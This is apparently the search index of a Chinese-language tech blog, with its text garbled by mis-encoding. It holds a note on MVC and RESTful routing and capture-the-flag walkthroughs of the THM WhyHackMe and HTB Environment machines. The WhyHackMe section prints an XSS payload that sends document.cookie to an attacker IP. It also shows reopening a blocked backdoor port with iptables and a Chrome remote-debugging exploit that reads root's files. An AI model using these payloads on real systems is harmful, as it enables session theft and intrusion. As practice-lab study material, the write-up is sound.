async (req, res) =\u003e { const result = await UserService.getList(req.params) res.send({ ActionType: \"OK\", data: result }) } Cå±‚å°±ä¼šå»è°ƒç”¨Så±‚ import UserModel from \"../../models/UserModel.js\" getList: async ({ id }) =\u003e { return id ? UserModel.find({ _id: id }, [\"username\", \"role\", \"avatar\", \"introduction\", \"gender\"]) : UserModel.find({}, [\"username\", \"role\", \"avatar\", \"introduction\", \"gender\"]) } Så±‚ä¼šå»è°ƒç”¨Må±‚ import mongoose from 'mongoose' const { Schema } = mongoose const UserSchema = new Schema({ username: String, password: String, gender: Number, // 0-æœªçŸ¥ï¼Œ1-ç”·ï¼Œ2-å¥³ introduction: String, // ç®€ä»‹ avatar: String, // å¤´åƒåœ°å€ role: Number // 1-ç®¡ç†å‘˜ï¼Œ2-ç¼–è¾‘ }) // æ³¨å†Œå¹¶å¯¼å‡ºæ¨¡å‹ const UserModel = mongoose.model(\"user\", UserSchema) export default UserModel è¿™é‡Œå»è°ƒç”¨æ•°æ®æ¨¡å‹ï¼Œæ•´ä½“æµç¨‹å¯ä»¥æ˜æ˜¾æ„Ÿè§‰åˆ°æˆ‘æŠŠä¸€ä¸ªå‡½æ•°æ‹†æˆäº†ä¸‰ä¸ªæ–‡ä»¶é‡Œé¢çš„ä¸‰ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”ä¾æ¬¡è°ƒç”¨ï¼Œè¿™æ ·çš„å¥½å¤„æ˜¯ï¼Œå¦‚æœæ—¥åéœ€è¦ä¿®æ”¹æŸä¸ªé€»è¾‘ï¼Œæ¯”å¦‚æ•°æ®åº“çš„ï¼Œæˆ‘å¯ä»¥ç›´æ¥å»å®Œå–„æ¨¡å‹ï¼Œä¸šåŠ¡çš„ç›´æ¥å»ä¿®æ”¹Så±‚ï¼Œä¿®æ”¹ä¸€å¤„ï¼Œå…¶ä»–åœ°æ–¹å¼•ç”¨çš„åŒæ­¥æœ‰æ•ˆï¼Œæ›´åŠ è½»æ¾æ–¹ä¾¿ã€‚ä½†æ˜¯å¦‚æœé¡¹ç›®å¾ˆå¤§ï¼Œåˆæ¬¡ç¼–å†™çš„æ—¶å€™ä¼šå¾ˆéº»çƒ¦ ","date":"2025-06-06","objectID":"/thinking-mvc/:3:0","tags":["å¼€å‘","study"],"title":"å…³äºMVCçš„å°ç¬”è®°oræ€»ç»“","uri":"/thinking-mvc/"},{"categories":["nodejs"],"content":"MVC\u0026MVT MVTæ˜¯Djangoé‡‡ç”¨çš„æ¡†æ¶æ¨¡å¼ï¼ŒTæ˜¯Templateï¼Œè´Ÿè´£å°è£…æ„é€ è¦è¿”å›çš„htmlã€‚å¯¹äºMVCè¿›è¡Œäº†æ‹†åˆ†ï¼Œä¸»è¦ç‚¹åœ¨äºæŠŠCå±‚æ‹†åˆ†ï¼Œæœ‰ä¸€ä¸ªurlåˆ†å‘å™¨ï¼Œå®ƒçš„ä½œç”¨æ˜¯å°†ä¸€ä¸ªä¸ªURLçš„é¡µé¢è¯·æ±‚åˆ†å‘ç»™ä¸åŒçš„viewå¤„ç†ï¼Œviewå†è°ƒç”¨ç›¸åº”çš„Modelå’ŒTemplateã€‚å¥½å¤„æ˜¯è§£è€¦ URL ä¸ä¸šåŠ¡é€»è¾‘ path('blog/\u003cint:id\u003e/', views.blog_detail) æŠŠè·¯ç”±åˆå¹¶åœ¨ä¸€å¤„å»ç®¡ç†ï¼Œå¹¶ä¸”å’Œé€»è¾‘åˆ†å¼€(è¿™æ ·çœ‹nodejsä¹Ÿæœ‰è¿™ç§é£æ ¼)ã€‚å…¶ä»–çš„å¥½å¤„å°±æ˜¯Djangoè‡ªå·±å¼ºå¤§çš„Form ç³»ç»Ÿï¼Œä»Våˆ°Tä¸€æ¡é¾™æœåŠ¡ã€‚ æ€»ä½“æ¥è¯´MVTä¸æ˜¯æ²¡æœ‰Cå±‚ï¼Œè€Œæ˜¯è®©ä½ æ„Ÿè§‰æ²¡æœ‰Cå±‚ï¼Œå†™èµ·æ¥æ›´åŠ è‡ªç„¶ ","date":"2025-06-06","objectID":"/thinking-mvc/:4:0","tags":["å¼€å‘","study"],"title":"å…³äºMVCçš„å°ç¬”è®°oræ€»ç»“","uri":"/thinking-mvc/"},{"categories":["nodejs"],"content":"MVC+RESTful RESTfulæ˜¯ä¸€ç§ä¹¦å†™è§„èŒƒï¼Œè™½ç„¶æˆ‘å¾ˆä¸è§„èŒƒï¼Œä½†æ˜¯è¿˜æ˜¯å­¦ä¸€ä¸‹ RESTfulå°±æ˜¯å¯¹è‡ªå·±å†™çš„æ¥å£è¿›è¡Œè§„èŒƒåŒ–ï¼Œä½¿ç”¨RESTfulæ¶æ„å¯ä»¥å……åˆ†çš„å‘æŒ¥GETã€POSTã€PUTã€DELETE å››ç§è¯·æ±‚æ–¹å¼çš„æ„ä¹‰,ç®€å•çš„æ¥è¯´urlåœ°å€ä¸­åªåŒ…å«åè¯è¡¨ç¤ºèµ„æºï¼Œä½¿ç”¨httpçš„åŠ¨è¯(GET | POST | PUT | DELTE)è¡¨ç¤ºè¦è¿›è¡Œçš„åŠ¨ä½œè¿›è¡Œæ“ä½œèµ„æº é”™è¯¯çš„ç¼–å†™æ–¹å¼ //æ·»åŠ ç”¨æˆ· router.post('/user/addUser',(req,res)=\u003e{ //... }) //æ›´æ–°ç”¨æˆ·ä¿¡æ¯ router.put('/user/updateUser',(req,res)=\u003e{ //... }) //åˆ é™¤ç”¨æˆ· router.delete('/user/delUser',(req,res)=\u003e{ //... }) //è·å–ç”¨æˆ·ä¿¡æ¯ router.get('/user/getUser',(req,res)=\u003e{ //... }) é—®é¢˜ç‚¹ åŸå› è¯´æ˜å–µ ğŸš« æ¥å£ä¸­å‡ºç°äº†åŠ¨è¯ï¼ˆaddUser / getUserï¼‰ URL åº”è¯¥æ˜¯åè¯ï¼ŒåŠ¨è¯é‡å¤äº† HTTP æ–¹æ³•çš„è¯­ä¹‰ ğŸš« å¯è¯»æ€§ä½ /user/addUser åˆ°åº•æ˜¯åˆ›å»ºè¿˜æ˜¯æ›´æ–°ï¼Œçœ‹èµ·æ¥ä¸ç›´è§‚ ğŸš« ç»Ÿä¸€æ€§å·® æ¥å£æ²¡æœ‰ç»Ÿä¸€é£æ ¼ï¼Œæ‰©å±•æ€§å·®ï¼Œç»´æŠ¤å›°éš¾ ğŸš« éš¾ä»¥è‡ªåŠ¨åŒ–æ–‡æ¡£ç”Ÿæˆ Swaggerã€Postman æ— æ³•ç»Ÿä¸€è¯†åˆ« REST åŠ¨ä½œ æ­£ç¡®çš„ç¼–å†™æ–¹å¼ //æ·»åŠ ç”¨æˆ· router.post('/user',(req,res)=\u003e{ //... }) //æ›´æ–°ç”¨æˆ·ä¿¡æ¯ router.put('/user/:id',(req,res)=\u003e{ //... }) //åˆ é™¤ç”¨æˆ· router.delete('/user/:id',(req,res)=\u003e{ //... }) //è·å–ç”¨æˆ·ä¿¡æ¯ router.get('/user',(req,res)=\u003e{ //... }) ä¼˜ç‚¹ è¯´æ˜å–µ âœ… è¯­ä¹‰æ¸…æ™°ï¼ŒåŠ¨è¯ç»Ÿä¸€ /user æ˜¯èµ„æºåï¼ŒPOST å°±æ˜¯æ–°å¢ï¼ŒGET å°±æ˜¯æŸ¥è¯¢ï¼ŒPUT æ˜¯æ›´æ–° âœ… URL ç®€æ´æ˜äº† çœ‹ URL å°±çŸ¥é“æ˜¯å“ªä¸ªèµ„æºã€å¯¹è°è¿›è¡Œä»€ä¹ˆæ“ä½œ âœ… è‡ªåŠ¨æ–‡æ¡£æ›´å‹å¥½ Swagger/OpenAPI è¯†åˆ«æ¥å£æ›´æ™ºèƒ½ âœ… å‰åç«¯åä½œæ›´æ ‡å‡†åŒ– ä¸å†éœ€è¦é æ¥å£æ³¨é‡Šæ¥ç†è§£ç”¨é€” âœ… æ›´ç¬¦åˆ REST æ ‡å‡† æ˜“äºå›¢é˜Ÿåä½œã€ä»£ç è§„èŒƒåŒ– âœ… åˆ©äºæƒé™æ§åˆ¶/ç¼“å­˜æœºåˆ¶ å› ä¸ºè¯­ä¹‰æ˜ç¡®ï¼Œå¯å¯¹ä¸åŒæ–¹æ³•åšç²¾ç»†æ§åˆ¶ RESTful è·¯ç”±æ ‡å‡†ç¤ºä¾‹æ€»ç»“ æ“ä½œ æ–¹æ³• URL ç¤ºä¾‹ è¯´æ˜ è·å–æ‰€æœ‰ç”¨æˆ· GET /users åˆ—è¡¨ è·å–å•ä¸ªç”¨æˆ· GET /users/:id è¯¦æƒ… æ–°å¢ç”¨æˆ· POST /users åˆ›å»º æ›´æ–°ç”¨æˆ· PUT /users/:id ä¿®æ”¹ åˆ é™¤ç”¨æˆ· DELETE /users/:id åˆ é™¤ ç”¨äººè¯è¯´è¿™å°±æ˜¯è®©å‰åç«¯çš„æ²Ÿé€šæ›´åŠ ç®€å•è‡ªç„¶ ","date":"2025-06-06","objectID":"/thinking-mvc/:5:0","tags":["å¼€å‘","study"],"title":"å…³äºMVCçš„å°ç¬”è®°oræ€»ç»“","uri":"/thinking-mvc/"},{"categories":["nodejs"],"content":"æ€»ç»“ MVCæ˜¯ä¸€ä¸ªæ€æƒ³ï¼Œä¸æ˜¯ä¸€ä¸ªå›ºå®šçš„ä¸œè¥¿ï¼Œé€‚åˆè‡ªå·±/å›¢é˜Ÿçš„å°±æ˜¯æœ€å¥½çš„xd ","date":"2025-06-06","objectID":"/thinking-mvc/:6:0","tags":["å¼€å‘","study"],"title":"å…³äºMVCçš„å°ç¬”è®°oræ€»ç»“","uri":"/thinking-mvc/"},{"categories":["é¶åœº"],"content":"å‰è¨€ THMçš„ä¸€ä¸ªä¸­ç­‰éš¾åº¦é¶æœºï¼Œä¸»è¦æ˜¯xssç›¸å…³ï¼ŸæŒºéš¾çš„ï¼ˆ ","date":"2025-06-02","objectID":"/thm-whyhackme/:1:0","tags":["æ¸—é€"],"title":"THM WhyHackMe","uri":"/thm-whyhackme/"},{"categories":["é¶åœº"],"content":"å¤–ç½‘æ‰“ç‚¹ nmap+dirsearchå¯åŠ¨ nmap -sC -sV 10.10.146.135 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-02 15:53 CST Nmap scan report for 10.10.146.135 Host is up (0.24s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 318 Mar 14 2023 update.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.21.155.141 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA) | 256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA) |_ 256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Welcome!! |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 56.16 seconds python dirsearch.py -u http://10.10.146.135 _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12290 Target: http://10.10.146.135/ [15:57:12] Scanning: [15:57:27] 403 - 278B - /.php [15:58:04] 301 - 315B - /assets -\u003e http://10.10.146.135/assets/ [15:58:04] 200 - 1KB - /assets/ [15:58:11] 403 - 278B - /cgi-bin/ [15:58:11] 403 - 278B - /cgi-bin/awstats.pl [15:58:11] 403 - 278B - /cgi-bin/a1stats/a1disp.cgi [15:58:11] 403 - 278B - /cgi-bin/awstats/ [15:58:11] 403 - 278B - /cgi-bin/htmlscript [15:58:11] 403 - 278B - /cgi-bin/login [15:58:11] 403 - 278B - /cgi-bin/login.php [15:58:11] 403 - 278B - /cgi-bin/login.cgi [15:58:11] 403 - 278B - /cgi-bin/mt-xmlrpc.cgi [15:58:11] 403 - 278B - /cgi-bin/mt.cgi [15:58:11] 403 - 278B - /cgi-bin/mt/mt-xmlrpc.cgi [15:58:11] 403 - 278B - /cgi-bin/mt/mt.cgi [15:58:11] 403 - 278B - /cgi-bin/mt7/mt-xmlrpc.cgi [15:58:11] 403 - 278B - /cgi-bin/mt7/mt.cgi [15:58:11] 403 - 278B - /cgi-bin/php.ini [15:58:11] 403 - 278B - /cgi-bin/printenv.pl [15:58:11] 403 - 278B - /cgi-bin/ViewLog.asp [15:58:11] 403 - 278B - /cgi-bin/test-cgi [15:58:11] 403 - 278B - /cgi-bin/test.cgi [15:58:11] 403 - 278B - /cgi-bin/htimage.exe?2,2 [15:58:11] 403 - 278B - /cgi-bin/imagemap.exe?2,2 [15:58:11] 403 - 278B - /cgi-bin/index.html [15:58:11] 403 - 278B - /cgi-bin/printenv [15:58:15] 200 - 0B - /config.php [15:58:22] 403 - 278B - /dir [15:58:36] 200 - 563B - /index.php [15:58:36] 200 - 563B - /index.php/login/ [15:58:42] 200 - 523B - /login.php [15:58:43] 302 - 0B - /logout.php -\u003e login.php [15:59:02] 200 - 643B - /register.php [15:59:06] 403 - 278B - /server-status/ [15:59:06] 403 - 278B - /server-status Task Completed è¿™ä¸ªæ—¶å€™ç¼“ä¸€ä¸‹ï¼Œå·®ç‚¹å¿˜è®°21ftpæ²¡çœ‹ï¼Œç›´æ¥è¿æ¥ä¸Šå»æ‹¿ä¸‹æ¥ä¸€ä¸ªæ–‡ä»¶ cat update.txt Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. - admin çŸ¥é“äº†ç”¨æˆ·åadminå’Œcommonï¼Œè¿˜æœ‰ä¸€ä¸ªè·¯å¾„/dir/pass.txt å…ˆè®¿é—®ä¸€ä¸‹ç½‘ç«™ï¼Œæ˜¯ä¸ªblogï¼Œæœ€ä¸‹é¢ä¸€è¡Œ Name: admin Comment: Hey people, I will be monitoring your comments so please be safe and civil. ç®¡ç†å‘˜è¯´è‡ªå·±ä¼šæ£€æŸ¥è¯„è®ºï¼Œå¯èƒ½æ˜¯xsså¼¹cookieäº†ï¼Œè®©æˆ‘æƒ³èµ·æ¥äº†ä¸å¥½çš„å›å¿†(ccb)ã€‚/register.phpå¯ä»¥å»æ³¨å†Œç”¨æˆ·ï¼Œåˆ›å»ºä¸€ä¸ªæ™®é€šè´¦æˆ·ï¼Œå°è¯•xssæ²¡æœ‰ç”¨ã€‚å°è¯•ä¸€ä¸‹ç”¨æˆ·å\u003cscript\u003ealert(1);\u003c/script\u003eï¼Œæ˜¯æœ‰æ•ˆæœçš„ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥è¦ä¹ˆæ‹¿åˆ°cookieï¼Œè¦ä¹ˆæ‹¿åˆ°æ•æ„Ÿæ–‡ä»¶ã€‚ è¿˜æ˜¯å…ˆå°è¯•æ‹¿cookieå§ï¼Œæ¯•ç«Ÿæ˜¯amdin \u003cscript\u003efetch(\"http://10.21.155.141:9000\",{method: \"POST\", body: document.cookie});\u003c/script\u003e bpå»æ‹¦æˆªè¯„è®ºå‘è¡¨ï¼Œæ”¾åŒ…çœ‹æœ¬åœ°å›æ˜¾ï¼Œå‘ç°æ— å›æ˜¾ï¼Œçœ‹æ¥ä¸å¤ªè¡Œï¼Œå°è¯•æ‹¿æ–‡ä»¶å§ï¼Œå‚è€ƒè¿™ä¸ªæ–‡æ¡£ä»¥åŠè¿™ä¸ªå¸–å­ // TrustedSec Proof-of-Concept to steal // sensitive data through XSS payload function re","date":"2025-06-02","objectID":"/thm-whyhackme/:2:0","tags":["æ¸—é€"],"title":"THM WhyHackMe","uri":"/thm-whyhackme/"},{"categories":["é¶åœº"],"content":"ææƒ jack@ubuntu:~$ sudo -l [sudo] password for jack: Matching Defaults entries for jack on ubuntu: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jack may run the following commands on ubuntu: (ALL : ALL) /usr/sbin/iptables jack@ubuntu:/opt$ ls -la total 40 drwxr-xr-x 2 root root 4096 Aug 16 2023 . drwxr-xr-x 19 root root 4096 Mar 14 2023 .. -rw-r--r-- 1 root root 27247 Aug 16 2023 capture.pcap -rw-r--r-- 1 root root 388 Aug 16 2023 urgent.txt jack@ubuntu:/opt$ cat urgent.txt Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first. (GPTç¿»è¯‘ï¼šå˜¿ï¼Œä¼™è®¡ä»¬ï¼Œé­åˆ°æ”»å‡»ä¹‹åï¼Œæœ‰ä¸€äº›æ–‡ä»¶è¢«æ”¾åˆ°äº† /usr/lib/cgi-bin/ ç›®å½•ä¸‹ï¼Œè€Œä¸”å³ä½¿æˆ‘æ˜¯ root ç”¨æˆ·ï¼Œæˆ‘ä¹Ÿåˆ ä¸æ‰å®ƒä»¬ã€‚è¯·å¸®æˆ‘åˆ†æä¸€ä¸‹ /opt ç›®å½•ä¸‹çš„ pcap æ–‡ä»¶ï¼Œå¹¶å¸®æˆ‘ä¿®å¤æœåŠ¡å™¨ã€‚æˆ‘ç›®å‰å·²ç»ç”¨ iptables è§„åˆ™æš‚æ—¶é˜»æ­¢äº†æ”»å‡»è€…è®¿é—®åé—¨ã€‚ä½†æœåŠ¡å™¨çš„æ¸…ç†å·¥ä½œè¿˜æ²¡æœ‰å®Œæˆï¼Œæˆ‘éœ€è¦å…ˆæŠŠè¿™äº›æ–‡ä»¶åˆ é™¤æ‰ã€‚) jack@ubuntu:/opt$ ls -la /usr/lib/ total 1144 drwxr-xr-x 91 root root 4096 Jan 29 2024 . drwxr-xr-x 14 root root 4096 Aug 31 2022 .. drwxr-xr-x 2 root root 4096 Jan 29 2024 accountsservice drwxr-xr-x 3 root root 4096 Mar 14 2023 apache2 drwxr-xr-x 2 root root 4096 Aug 31 2022 apparmor drwxr-xr-x 5 root root 4096 Aug 31 2022 apt drwxr-xr-x 2 root root 4096 Mar 14 2023 bfd-plugins drwxr-xr-x 2 root root 4096 Apr 22 2020 binfmt.d drwxr-xr-x 3 root root 4096 Aug 31 2022 byobu drwxr-x--- 2 root h4ck3d 4096 Aug 16 2023 cgi-bin å¯ä»¥çœ‹è§è¿™ç©æ„å·²ç»è¢«åˆ†é…åˆ°h4ck3däº†ï¼Œè¿˜æœ‰ä¸ªæµé‡åŒ…ï¼Œdumpåˆ°æœ¬åœ°ï¼Œçœ‹é²¨é±¼å¯åŠ¨ Listen 41312 \u003cVirtualHost *:41312\u003e ServerName www.example.com ServerAdmin webmaster@localhost ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined SSLEngine on SSLCipherSuite AES256-SHA SSLProtocol -all +TLSv1.2 SSLCertificateFile /etc/apache2/certs/apache-certificate.crt SSLCertificateKeyFile /etc/apache2/certs/apache.key ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/ AddHandler cgi-script .cgi .py .pl DocumentRoot /usr/lib/cgi-bin/ \u003cDirectory \"/usr/lib/cgi-bin\"\u003e AllowOverride All Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch Order allow,deny Allow from all \u003c/Directory\u003e \u003c/VirtualHost\u003e çœ‹çœ‹iptables çš„é…ç½® jack@ubuntu:/opt$ sudo /usr/sbin/iptables -L --line-numbers Chain INPUT (policy ACCEPT) num target prot opt source destination 1 DROP tcp -- anywhere anywhere tcp dpt:41312 2 ACCEPT all -- anywhere anywhere 3 ACCEPT all -- anywhere anywhere ctstate NEW,RELATED,ESTABLISHED 4 ACCEPT tcp -- anywhere anywhere tcp dpt:ssh 5 ACCEPT tcp -- anywhere anywhere tcp dpt:http 6 ACCEPT icmp -- anywhere anywhere icmp echo-request 7 ACCEPT icmp -- anywhere anywhere icmp echo-reply 8 DROP all -- anywhere anywhere Chain FORWARD (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination 1 ACCEPT all -- anywhere anywhere åæ­£éƒ½æ˜¯å›´ç»•ç€è¿™ä¸ªç«¯å£æçš„ï¼Œè¿™ä¸ªç«¯å£ç›®å‰ä¸èƒ½è®¿é—®çš„ï¼Œæ›¿æ¢è§„åˆ™å…ˆ jack@ubuntu:/opt$ sudo /usr/sbin/iptables -R INPUT 1 -p tcp -m tcp --dport 41312 -j ACCEPT jack@ubuntu:/opt$ sudo /usr/sbin/iptables -L --line-numbers Chain INPUT (policy ACCEPT) num target prot opt source destination 1 ACCEPT tcp -- anywhere anywhere tcp dpt:41312 2 ACCEPT all -- anywhere anywhere 3 ACCEPT all -- anywhere anywhere ctstate NEW,RELATED,ESTABLISHED 4 ACCEPT tcp -- anywhere anywhere tcp dpt:ssh 5 ACCEPT tcp -- anywhere anywhere tcp dpt:http 6 ACCEPT icmp -- anywhere anywhere icmp echo-request 7 ACCEPT icmp -- anywhere anywhere icmp echo-reply 8 DROP all -- anywhere anywhere Chain FORWARD (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination 1 ACCEPT all -- anywhere anywhere ç„¶åè®¿é—®è¿™ä¸ªç«¯å£ï¼Œæ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œè¿˜æ˜¯HTTPSè®¿é—®ï¼Œä¼°è®¡æ˜¯æè¯ä¹¦å»è§£å¯†æµé‡åŒ…äº† æµé‡ç›¸å…³çœ‹è¿™ä¸ªå¸–å­ æˆ‘ä»¬å·²ç»çŸ¥é“ https æœåŠ¡å™¨ä½¿ç”¨ /etc/apache2/sites-enabled/000-default.conf ä¸­ /etc/apache2/certs/apache.key ä¸­çš„å¯†é’¥ã€‚ ç”¨æˆ· jack å¯ä»¥è¯»å–å¯†é’¥ã€‚å› æ­¤ï¼Œä¸‹è½½å¯†é’¥å¹¶é€šè¿‡ Edit-\u003ePreferences-\u003eProtocols-\u003eTLS ","date":"2025-06-02","objectID":"/thm-whyhackme/:3:0","tags":["æ¸—é€"],"title":"THM WhyHackMe","uri":"/thm-whyhackme/"},{"categories":["é¶åœº"],"content":"å¦ä¸€ç§rootæ–¹æ³• çœ‹jaxafedä½¬çš„blogå‘ç°çš„ é¦–å…ˆç©¿ä¸ªpspyä¸Šå»ï¼Œå‘ç°ä¸€ä¸ªè¿›ç¨‹è°ƒç”¨çš„æ˜¯rootï¼Œå¹¶ä¸”æ˜¯ç”± pyppeteer æ§åˆ¶çš„ chrome 2024/01/06 05:44:19 CMD: UID=0 PID=32385 | /root/.local/share/pyppeteer/local-chromium/588429/chrome-linux/chrome --disable-background-networking --disable-background-timer-throttling --disable-breakpad --disable-browser-side-navigation --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-features=site-per-process --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --disable-translate --metrics-recording-only --no-first-run --safebrowsing-disable-auto-update --enable-automation --password-store=basic --use-mock-keychain --headless --hide-scrollbars --mute-audio about:blank --no-sandbox --remote-debugging-port=46775 --user-data-dir=/root/.local/share/pyppeteer/.dev_profile/tmpk9ujyvwz æ­¤ç«¯å£å¯ç”¨äºæ§åˆ¶æµè§ˆå™¨å’Œè¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæ–¹æ³•æ˜¯ä½¿æµè§ˆå™¨å¯¼èˆªåˆ°å…·æœ‰ file:// åè®®çš„ URLï¼Œå¹¶å‘Šè¯‰å®ƒå‘é€é¡µé¢å†…å®¹. ç”¨çš„è¿™ä¸ªæ–¹æ³• ç”±äºæ¼æ´åˆ©ç”¨æ‰€éœ€çš„æ‰€æœ‰ Python åŒ…åœ¨ç›®æ ‡ä¸Šä¸å¯ç”¨ï¼Œå› æ­¤æˆ‘å°†åœ¨æˆ‘çš„è®¡ç®—æœºä¸Šè¿è¡Œè¯¥æ¼æ´ã€‚ä½†æ˜¯ Chrome ç«¯å£æ­£åœ¨ä¾¦å¬ 127.0.0.1ï¼Œå› æ­¤éœ€è¦ä»å¤–éƒ¨è®¿é—®å®ƒã€‚ Chrome è¿›ç¨‹æ¯æ¬¡éƒ½ä½¿ç”¨ä¸åŒçš„è°ƒè¯•ç«¯å£è¿è¡Œï¼Œå¹¶ä¸”è¿è¡Œæ—¶é—´éå¸¸çŸ­ã€‚å› æ­¤ï¼Œæˆ‘ä¸ä¼šåœ¨çœ‹åˆ°è¿›ç¨‹åå°è¯•è½¬å‘ç«¯å£ï¼Œè€Œæ˜¯ä½¿ç”¨ ssh å»ºç«‹ä¸€ä¸ª socks ä»£ç†ã€‚ ä¿®æ”¹ /etc/proxychains4.conf ä»¥ä¾¿èƒ½å¤Ÿå°† socks ä»£ç†ä¸ proxychains ä¸€èµ·ä½¿ç”¨ã€‚ ... # defaults set to \"tor\" #socks4 127.0.0.1 9050 socks5 127.0.0.1 1080 ç„¶åå†ä¿®æ”¹ä¸€ç‚¹ä¸œè¥¿ å°† victim æ›´æ”¹ä¸º 127.0.0.1ã€‚ å¯ä»¥å°†ç›®æ ‡ç«¯å£ä½œä¸ºå‘½ä»¤è¡Œå‚æ•°ä¼ é€’ã€‚ å°† url ä» file:///etc/passwd æ›´æ”¹ä¸º file:///root/root.txtã€‚ ç°åœ¨ï¼Œå½“æˆ‘çœ‹åˆ° Chrome ä¸‹æ¬¡è¿è¡Œæ—¶ï¼Œæˆ‘å°†ä½¿ç”¨ä»£ç†é“¾å’Œ â€“remote-debugging-port å‚æ•°ä¸­æŒ‡å®šçš„ç«¯å£æ¥è¿è¡Œæ¼æ´åˆ©ç”¨ã€‚å¤šè¿è¡Œå‡ æ¬¡å°±å¯ä»¥æ‹¿åˆ°äº† $ proxychains -q ./chrome_remote_debug_lfi.py 44523 ws://127.0.0.1:44523/devtools/page/3FC55BCC759CB7D158BDB700C2E84ADE {\"id\":3592,\"result\":{\"frameId\":\"3FC55BCC759CB7D158BDB700C2E84ADE\",\"loaderId\":\"B35E879C2B29484750665A8B1EF9A15A\"}} {\"id\":3593,\"result\":{\"result\":{\"type\":\"string\",\"value\":\"\u003chtml\u003e\u003chead\u003e\u003c/head\u003e\u003cbody\u003e\u003cpre style=\\\"word-wrap: break-word; white-space: pre-wrap;\\\"\u003e[REDACTED]\\n\u003c/pre\u003e\u003c/body\u003e\u003c/html\u003e\"}}} ","date":"2025-06-02","objectID":"/thm-whyhackme/:4:0","tags":["æ¸—é€"],"title":"THM WhyHackMe","uri":"/thm-whyhackme/"},{"categories":["é¶åœº"],"content":"æ€»ç»“ çœ‹é²¨é±¼æ˜¯çœŸçš„ä¸ä¼šå•Šxdï¼Œå¾—è¡¥è¡¥çŸ¥è¯†äº†ã€‚è¿˜æœ‰xssçš„ç®—æ˜¯æ–°æ–¹æ³•å§å¯¹æˆ‘æ¥è¯´ï¼Œçœ‹åˆ«äººçš„wpå»å¤ç°ä¸¤ä¸‰éä¹Ÿæ˜¯æœ‰ç”¨çš„ ","date":"2025-06-02","objectID":"/thm-whyhackme/:5:0","tags":["æ¸—é€"],"title":"THM WhyHackMe","uri":"/thm-whyhackme/"},{"categories":["é¶åœº"],"content":"å‰è¨€ ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é¶æœºï¼ŒHTBä¸­ç­‰éš¾åº¦ ","date":"2025-06-02","objectID":"/htb-environment/:1:0","tags":["æ¸—é€"],"title":"HTB Environment","uri":"/htb-environment/"},{"categories":["é¶åœº"],"content":"å¤–ç½‘æ‰“ç‚¹ æŒ‰ç…§æƒ¯ä¾‹nmap+dirsearch nmap -sC -sV 10.10.11.67 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-31 20:35 CST Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 46.63% done; ETC: 20:38 (0:01:29 remaining) Stats: 0:02:17 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 54.81% done; ETC: 20:39 (0:01:50 remaining) Stats: 0:03:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 61.43% done; ETC: 20:40 (0:01:54 remaining) Stats: 0:05:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 79.51% done; ETC: 20:42 (0:01:19 remaining) Stats: 0:06:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 94.33% done; ETC: 20:43 (0:00:25 remaining) Stats: 0:06:55 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 94.34% done; ETC: 20:43 (0:00:25 remaining) Nmap scan report for 10.10.11.67 Host is up (1.1s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0) | ssh-hostkey: | 256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA) |_ 256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab 